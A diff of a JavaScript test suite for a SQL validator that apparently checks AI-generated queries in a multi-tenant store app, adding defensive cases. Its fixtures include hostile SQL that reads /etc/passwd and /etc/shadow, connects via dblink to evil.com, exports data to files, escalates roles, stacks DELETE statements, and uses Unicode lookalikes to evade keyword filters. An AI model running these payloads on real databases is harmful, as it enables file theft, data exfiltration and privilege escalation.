@@ -4,7 +4,7 @@ import { validateSql } from '../../../src/ai/sqlValidator.js';
 describe('validateSql', () => {
   // ── Valid queries ──────────────────────────────────────────
   describe('valid queries', () => {
-    it('accepts a valid SELECT with store_id and LIMIT', () => {
+    it('accepts a valid SELECT with store_id = $1 and LIMIT', () => {
       const sql = "SELECT COUNT(*) FROM orders WHERE store_id = $1 LIMIT 1";
       const result = validateSql(sql);
 
@@ -13,7 +13,7 @@ describe('validateSql', () => {
       expect(result.sql).toBe(sql);
     });
 
-    it('accepts a complex JOIN query with store_id and LIMIT', () => {
+    it('accepts a complex JOIN query with store_id = $1 and LIMIT', () => {
       const sql =
         "SELECT p.name, SUM(oi.total) AS revenue FROM order_items oi JOIN products p ON oi.product_id = p.id AND p.store_id = $1 WHERE oi.store_id = $1 GROUP BY p.name ORDER BY revenue DESC LIMIT 10";
       const result = validateSql(sql);
@@ -82,6 +82,23 @@ describe('validateSql', () => {
       expect(result.valid).toBe(true);
       expect(result.sql).not.toContain('LIMIT 100');
     });
+
+    it('caps LIMIT values exceeding 1000', () => {
+      const sql = "SELECT * FROM orders WHERE store_id = $1 LIMIT 999999";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(true);
+      expect(result.sql).toContain('LIMIT 1000');
+      expect(result.sql).not.toContain('999999');
+    });
+
+    it('preserves LIMIT values at or below 1000', () => {
+      const sql = "SELECT * FROM orders WHERE store_id = $1 LIMIT 1000";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(true);
+      expect(result.sql).toContain('LIMIT 1000');
+    });
   });
 
   // ── SELECT-only enforcement ────────────────────────────────
@@ -131,7 +148,7 @@ describe('validateSql', () => {
     });
 
     it('rejects CREATE queries', () => {
-      const sql = "CREATE TABLE hack (id INT) WHERE store_id = $1";
+      const sql = "CREATE TABLE hack (id INT)";
       const result = validateSql(sql);
 
       expect(result.valid).toBe(false);
@@ -139,7 +156,7 @@ describe('validateSql', () => {
     });
 
     it('rejects TRUNCATE queries', () => {
-      const sql = "TRUNCATE orders WHERE store_id = $1";
+      const sql = "TRUNCATE orders";
       const result = validateSql(sql);
 
       expect(result.valid).toBe(false);
@@ -147,7 +164,7 @@ describe('validateSql', () => {
     });
 
     it('rejects GRANT queries', () => {
-      const sql = "GRANT ALL ON orders TO hacker WHERE store_id = $1";
+      const sql = "GRANT ALL ON orders TO hacker";
       const result = validateSql(sql);
 
       expect(result.valid).toBe(false);
@@ -155,7 +172,7 @@ describe('validateSql', () => {
     });
 
     it('rejects REVOKE queries', () => {
-      const sql = "REVOKE ALL ON orders FROM user1 WHERE store_id = $1";
+      const sql = "REVOKE ALL ON orders FROM user1";
       const result = validateSql(sql);
 
       expect(result.valid).toBe(false);
@@ -180,6 +197,31 @@ describe('validateSql', () => {
       expect(result.errors.some((e) => e.includes('EXECUTE'))).toBe(true);
     });
 
+    it('rejects COPY queries', () => {
+      const sql = "COPY orders TO '/tmp/data.csv'";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('COPY'))).toBe(true);
+    });
+
+    it('rejects CALL queries', () => {
+      const sql = "CALL some_procedure()";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('CALL'))).toBe(true);
+    });
+
+    it('rejects RETURNING clause', () => {
+      const sql =
+        "SELECT * FROM orders WHERE store_id = $1; DELETE FROM orders RETURNING *";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('RETURNING'))).toBe(true);
+    });
+
     it('detects forbidden keywords case-insensitively', () => {
       const sql =
         "select * from orders where store_id = $1; insert into orders values (1)";
@@ -190,21 +232,198 @@ describe('validateSql', () => {
     });
   });
 
+  // ── SELECT INTO prevention ────────────────────────────────
+  describe('SELECT INTO prevention', () => {
+    it('rejects SELECT INTO (table creation)', () => {
+      const sql =
+        "SELECT * INTO attacker_table FROM customers WHERE store_id = $1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors).toContain('SELECT INTO is not allowed');
+    });
+
+    it('rejects SELECT ... INTO with columns', () => {
+      const sql =
+        "SELECT id, name INTO new_table FROM orders WHERE store_id = $1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors).toContain('SELECT INTO is not allowed');
+    });
+  });
+
+  // ── CTE (WITH) prevention ─────────────────────────────────
+  describe('CTE (WITH) prevention', () => {
+    it('rejects WITH/CTE queries', () => {
+      const sql =
+        "WITH cte AS (SELECT * FROM orders WHERE store_id = $1) SELECT * FROM cte LIMIT 100";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors).toContain('CTE (WITH) queries are not allowed');
+    });
+
+    it('rejects WITH wrapping a write operation', () => {
+      const sql =
+        "WITH cte AS (DELETE FROM orders WHERE store_id = $1 RETURNING *) SELECT * FROM cte LIMIT 100";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors).toContain('CTE (WITH) queries are not allowed');
+    });
+  });
+
+  // ── Dangerous PostgreSQL functions ────────────────────────
+  describe('dangerous PostgreSQL functions', () => {
+    it('rejects pg_read_file', () => {
+      const sql =
+        "SELECT pg_read_file('/etc/passwd') AS data FROM orders WHERE store_id = $1 LIMIT 1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('pg_read_file'))).toBe(true);
+    });
+
+    it('rejects pg_read_binary_file', () => {
+      const sql =
+        "SELECT pg_read_binary_file('/etc/shadow') FROM orders WHERE store_id = $1 LIMIT 1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('pg_read_binary_file'))).toBe(true);
+    });
+
+    it('rejects pg_ls_dir', () => {
+      const sql =
+        "SELECT pg_ls_dir('/tmp') AS files FROM orders WHERE store_id = $1 LIMIT 1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('pg_ls_dir'))).toBe(true);
+    });
+
+    it('rejects set_config (privilege escalation)', () => {
+      const sql =
+        "SELECT set_config('role', 'postgres', false) FROM orders WHERE store_id = $1 LIMIT 1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('set_config'))).toBe(true);
+    });
+
+    it('rejects pg_sleep (DoS vector)', () => {
+      const sql =
+        "SELECT pg_sleep(999) FROM orders WHERE store_id = $1 LIMIT 1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('pg_sleep'))).toBe(true);
+    });
+
+    it('rejects dblink (remote connections)', () => {
+      const sql =
+        "SELECT dblink('host=evil.com', 'SELECT 1') FROM orders WHERE store_id = $1 LIMIT 1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('dblink'))).toBe(true);
+    });
+
+    it('rejects lo_export (large object exfiltration)', () => {
+      const sql =
+        "SELECT lo_export(12345, '/tmp/dump') FROM orders WHERE store_id = $1 LIMIT 1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('lo_export'))).toBe(true);
+    });
+
+    it('rejects pg_terminate_backend', () => {
+      const sql =
+        "SELECT pg_terminate_backend(12345) FROM orders WHERE store_id = $1 LIMIT 1";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('pg_terminate_backend'))).toBe(true);
+    });
+  });
+
+  // ── SET/RESET enforcement ──────────────────────────────────
+  describe('SET/RESET enforcement', () => {
+    it('rejects SET statements', () => {
+      const sql = "SET ROLE admin";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('SET'))).toBe(true);
+    });
+
+    it('rejects RESET statements', () => {
+      const sql = "RESET ROLE";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors.some((e) => e.includes('RESET'))).toBe(true);
+    });
+  });
+
   // ── store_id enforcement ───────────────────────────────────
   describe('store_id enforcement', () => {
-    it('rejects SQL without store_id reference', () => {
+    it('rejects SQL without store_id = $1', () => {
       const sql = "SELECT COUNT(*) FROM orders LIMIT 1";
       const result = validateSql(sql);
 
       expect(result.valid).toBe(false);
       expect(result.errors).toContain(
-        'Query must include store_id for tenant isolation',
+        'Query must filter by store_id = $1 for tenant isolation',
       );
     });
 
-    it('accepts store_id in different positions', () => {
+    it('accepts store_id = $1 in different positions', () => {
       const sql =
         "SELECT * FROM orders o WHERE o.store_id = $1 LIMIT 10";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(true);
+    });
+
+    it('rejects store_id as string literal only (bypass attempt)', () => {
+      const sql =
+        "SELECT 'store_id' AS label, COUNT(*) FROM orders LIMIT 100";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors).toContain(
+        'Query must filter by store_id = $1 for tenant isolation',
+      );
+    });
+
+    it('rejects store_id as column alias (bypass attempt)', () => {
+      const sql =
+        "SELECT id AS store_id FROM orders LIMIT 100";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors).toContain(
+        'Query must filter by store_id = $1 for tenant isolation',
+      );
+    });
+
+    it('rejects hardcoded store_id value (must use $1 parameter)', () => {
+      const sql =
+        "SELECT * FROM orders WHERE store_id = '550e8400-e29b-41d4-a716-446655440000' LIMIT 10";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors).toContain(
+        'Query must filter by store_id = $1 for tenant isolation',
+      );
+    });
+
+    it('accepts store_id = $1 with spaces around equals', () => {
+      const sql =
+        "SELECT * FROM orders WHERE store_id=$1 LIMIT 10";
       const result = validateSql(sql);
 
       expect(result.valid).toBe(true);
@@ -259,6 +478,27 @@ describe('validateSql', () => {
     });
   });
 
+  // ── ASCII enforcement ─────────────────────────────────────
+  describe('ASCII enforcement', () => {
+    it('rejects SQL with unicode characters', () => {
+      const sql =
+        "SELECT * FROM orders WHERE store_id = $1 AND name = '\u0421ELECT' LIMIT 10";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors).toContain('SQL must contain only ASCII characters');
+    });
+
+    it('rejects fullwidth characters used to bypass keyword detection', () => {
+      const sql =
+        "SELECT * FROM orders WHERE store_id = $1 AND col = '\uff24ELET' LIMIT 10";
+      const result = validateSql(sql);
+
+      expect(result.valid).toBe(false);
+      expect(result.errors).toContain('SQL must contain only ASCII characters');
+    });
+  });
+
   // ── Edge cases ─────────────────────────────────────────────
   describe('edge cases', () => {
     it('rejects empty string', () => {
@@ -289,7 +529,7 @@ describe('validateSql', () => {
       const result = validateSql(sql);
 
       expect(result.valid).toBe(false);
-      // Should have: not SELECT, forbidden DELETE, no store_id
+      // Should have: not SELECT, forbidden DELETE, no store_id = $1
       expect(result.errors.length).toBeGreaterThanOrEqual(3);
     });
 
@@ -315,10 +555,6 @@ describe('validateSql', () => {
         "SELECT execution_time FROM orders WHERE store_id = $1 LIMIT 10";
       const result = validateSql(sql);
 
-      // execution_time does NOT match \bEXEC\b because there is no word boundary after EXEC
-      // Actually "execution_time" would NOT match \bEXEC\b because 'u' follows 'c'
-      // But \bEXECUTE\b would not match "execution_time" either
-      // Let's verify the validator handles this correctly
       expect(result.valid).toBe(true);
     });
   });
